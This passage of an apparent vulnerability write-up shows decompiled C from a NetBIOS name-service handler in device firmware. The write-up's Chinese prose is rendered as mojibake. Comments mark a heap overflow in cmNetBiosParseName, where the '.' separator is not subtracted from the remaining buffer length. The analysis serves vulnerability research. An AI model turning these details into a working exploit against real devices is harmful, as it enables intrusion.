  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-28h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;178&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HIBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//---- [1]&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//heap overflow at netbios_ns_buffer  &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getname_query_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNamePositiveRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndExternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_17:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;238&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨ä¸Šè¿°ç¨‹å¼ç¢¼&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; ä¸­ï¼Œè©² &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; å‡½å¼ï¼Œæœƒå»è™•ç† Question æ¬„ä½ä¸­çš„åç¨±ï¼Œä¹Ÿæä¾›äº† buffer å¤§å°çµ¦è©²å‡½å¼ï¼Œç„¶è€Œè©²å‡½å¼ä¸¦æ²’æœ‰æ­£ç¢ºæª¢æŸ¥é•·åº¦ï¼Œå°è‡´è¤‡è£½éå¤šçš„è³‡æ–™åˆ° netbios_ns_buff å°è‡´ heap overflow&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; å‡½å¼&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-24h] BYREF&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resolveLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;maxlan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// ---------- [2]              // it does not subtract the length of &quot;.&quot;&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
